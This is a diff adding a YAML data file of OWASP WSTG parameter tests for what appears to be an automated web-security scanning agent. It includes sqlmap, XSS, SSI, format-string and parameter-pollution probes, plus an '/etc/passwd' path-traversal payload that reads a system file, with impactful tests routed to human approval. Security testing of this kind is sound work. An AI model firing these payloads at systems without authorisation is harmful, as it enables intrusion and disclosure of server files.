@@ -1,0 +1,81 @@
+# OWASP WSTG parameter-based app-layer tests — the SQLi/XSS/LFI/SSI/HPP/IDOR
+# coverage the surface phase generates from CRAWLED parameterized URLs.
+#
+# This is DATA, not code (CLAUDE.md "Knowledge is RAG-first"): edit here to add a
+# payload/probe or reclassify one — no code change — and it is embedded into
+# rag_documents by etl/load_knowledge_documents.py so the planner can retrieve it.
+# langgraph_engine._owasp_param_tests reads this file (bind-mounted) and builds
+# one test per matching parameter.
+#
+# Per entry:
+#   category   : the surface-test category (safe categories run autonomously;
+#                impactful ones queue for approval). Must be known to the engine.
+#   tool       : first command token; must be on the safe-lane allowlist for a
+#                safe category, else it (correctly) classifies impactful.
+#   inject     : how the request is built for the parameter:
+#                  payload    -> the parameter value is replaced with `payload`  ({url})
+#                  raw        -> the crawled URL is used as-is                    ({raw})
+#                  duplicate  -> the parameter is sent twice with payload[0],[1] ({url})
+#   command    : template; {raw}=crawled URL, {url}=built URL, {pname}=param name
+#   assertion  : structured assertion the run is judged by (expect_substring /
+#                expect_not_substring / expect_regex / expect_status)
+#   param_set  : (optional) restrict to a named parameter-name set — 'path' for
+#                LFI-style names, 'idor' for object-reference names
+#   wstg       : (optional) OWASP WSTG id recorded on the test
+#   impactful  : (optional) true => human-approval lane
+
+param_tests:
+  - category: sqli_detect
+    tool: sqlmap
+    inject: raw
+    wstg: WSTG-INPV-05
+    command: 'sqlmap -u "{raw}" -p {pname} --batch --smart --level 1 --risk 1 --flush-session'
+    assertion: {expect_regex: '(?i)(is vulnerable|injectable|parameter .* is|payload)'}
+
+  - category: xss_detect
+    tool: curl
+    inject: payload
+    payload: 'pxXSS<svg/onload=1>'
+    command: 'curl -sk "{url}"'
+    assertion: {expect_substring: ['pxXSS<svg/onload=1>']}
+
+  - category: lfi_read
+    tool: curl
+    inject: payload
+    param_set: path
+    payload: '../../../../../../etc/passwd'
+    command: 'curl -sk "{url}"'
+    assertion: {expect_substring: ['root:x:0:0']}
+
+  - category: ssi_detect
+    tool: curl
+    inject: payload
+    wstg: WSTG-INPV-08
+    payload: '<!--#echo var="DATE_LOCAL"-->'
+    command: 'curl -sk "{url}"'
+    assertion: {expect_not_substring: ['<!--#echo', '&lt;!--#echo']}
+
+  - category: format_string
+    tool: curl
+    inject: payload
+    wstg: WSTG-INPV-13
+    payload: '%25n%25s%25x%25x%25x'
+    command: 'curl -sk "{url}"'
+    assertion: {expect_regex: '(?i)(warning|fatal|segmentation|0x[0-9a-f]{6}|va_arg)'}
+
+  - category: hpp_detect
+    tool: curl
+    inject: duplicate
+    wstg: WSTG-INPV-04
+    payload: ['pxHPP1', 'pxHPP2']
+    command: 'curl -sk "{url}"'
+    assertion: {expect_regex: '(?i)pxHPP1.*pxHPP2|pxHPP2.*pxHPP1|pxHPP1pxHPP2'}
+
+  - category: idor
+    tool: curl
+    inject: raw
+    param_set: idor
+    impactful: true
+    wstg: WSTG-ATHZ-04
+    command: 'curl -sk "{raw}"'
+    assertion: {expect_status: 200}
